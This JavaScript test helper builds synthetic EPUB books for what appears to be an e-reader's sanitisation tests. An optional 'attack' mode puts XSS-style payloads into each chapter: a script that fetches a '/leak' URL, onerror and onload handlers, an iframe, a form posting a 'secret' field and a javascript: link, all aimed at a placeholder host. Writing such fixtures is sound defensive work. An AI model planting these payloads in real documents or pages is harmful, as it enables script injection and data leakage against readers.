const { zipSync, strToU8, zlibSync } = require("fflate");
function picture() {
  const chunk = (type, data) => {
    const bytes = Buffer.concat([Buffer.from(type), Buffer.from(data)]),
      n = Buffer.alloc(4),
      crc = Buffer.alloc(4);
    n.writeUInt32BE(data.length);
    let c = 0xffffffff;
    for (const b of bytes) {
      c ^= b;
      for (let k = 0; k < 8; k++) c = c & 1 ? (c >>> 1) ^ 0xedb88320 : c >>> 1;
    }
    crc.writeUInt32BE((c ^ 0xffffffff) >>> 0);
    return Buffer.concat([n, bytes, crc]);
  };
  const header = Buffer.alloc(13);
  header.writeUInt32BE(32, 0);
  header.writeUInt32BE(32, 4);
  header[8] = 8;
  header[9] = 2;
  const pixels = Buffer.alloc(32 * (1 + 32 * 3));
  for (let y = 0; y < 32; y++)
    for (let x = 0; x < 32; x++) {
      const i = y * 97 + 1 + x * 3;
      pixels[i] = 40;
      pixels[i + 1] = 110;
      pixels[i + 2] = 150;
    }
  return Buffer.concat([
    Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]),
    chunk("IHDR", header),
    chunk("IDAT", zlibSync(pixels)),
    chunk("IEND", Buffer.alloc(0)),
  ]);
}
function epub({
  chapters = 3,
  attack = false,
  extra = {},
  title = "Local Lighthouse",
  navVersion = 3,
} = {}) {
  const files = {
    mimetype: strToU8("application/epub+zip"),
    "META-INF/container.xml": strToU8(
      '<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/book.opf" media-type="application/oebps-package+xml"/></rootfiles></container>',
    ),
  };
  files["OEBPS/picture.png"] = picture();
  const manifest = [
      '<item id="cover" href="picture.png" media-type="image/png" properties="cover-image"/>',
    ],
    spine = [];
  for (let i = 1; i <= chapters; i++) {
    manifest.push(
      `<item id="c${i}" href="c${i}.xhtml" media-type="application/xhtml+xml"/>`,
    );
    spine.push(`<itemref idref="c${i}"/>`);
    files[`OEBPS/c${i}.xhtml`] = strToU8(
      `<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Chapter ${i}</title></head><body><h1 id="start">Chapter ${i}</h1><p>${"The lighthouse keeper counted the waves and wrote each visit in a notebook. ".repeat(i === 1 ? 180 : 4)}</p>${i < chapters ? `<a href="c${i + 1}.xhtml#start">Next chapter link</a>` : ""}${attack ? '<script>parent.__epubExecuted=true;fetch("https://example.invalid/leak")</script><img src="https://example.invalid/cover.png" onerror="parent.__epubExecuted=true"/><iframe src="https://example.invalid/frame"></iframe><form action="https://example.invalid/post"><input name="secret"/></form><style>@import url(https://example.invalid/style);</style><svg xmlns="http://www.w3.org/2000/svg" onload="parent.__epubExecuted=true"/><a href="javascript:parent.__epubExecuted=true">Unsafe link</a>' : ""}</body></html>`,
    );
  }
  files["OEBPS/book.opf"] = strToU8(
    `<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">synthetic-test</dc:identifier><dc:title>${title}</dc:title><dc:creator>Original QA Fiction</dc:creator></metadata><manifest>${manifest.join("")}</manifest><spine>${spine.join("")}</spine></package>`,
  );
  for (let i = 1; i <= chapters; i++)
    files[`OEBPS/c${i}.xhtml`] = strToU8(
      new TextDecoder()
        .decode(files[`OEBPS/c${i}.xhtml`])
        .replace(
          "</body>",
          '<img src="picture.png" alt="Original QA blue square"/></body>',
        ),
    );
  if (navVersion === 3) {
    files["OEBPS/nav.xhtml"] = strToU8(
      '<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><body><nav epub:type="toc"><ol>' +
        Array.from(
          { length: chapters },
          (_, i) => `<li><a href="c${i + 1}.xhtml">Chapter ${i + 1}</a></li>`,
        ).join("") +
        "</ol></nav></body></html>",
    );
    files["OEBPS/book.opf"] = strToU8(
      new TextDecoder()
        .decode(files["OEBPS/book.opf"])
        .replace(
          "</manifest>",
          '<item id="nav" href="nav.xhtml" properties="nav" media-type="application/xhtml+xml"/></manifest>',
        ),
    );
  }
  if (navVersion === 2) {
    files["OEBPS/toc.ncx"] = strToU8(
      '<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"><navMap>' +
        Array.from(
          { length: chapters },
          (_, i) =>
            `<navPoint id="n${i + 1}"><navLabel><text>Legacy chapter ${i + 1}</text></navLabel><content src="c${i + 1}.xhtml#start"/></navPoint>`,
        ).join("") +
        "</navMap></ncx>",
    );
    files["OEBPS/book.opf"] = strToU8(
      new TextDecoder()
        .decode(files["OEBPS/book.opf"])
        .replace('version="3.0"', 'version="2.0"')
        .replace(
          "</manifest>",
          '<item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/></manifest>',
        ),
    );
  }
  Object.assign(files, extra);
  return zipSync(files);
}
module.exports = { epub };
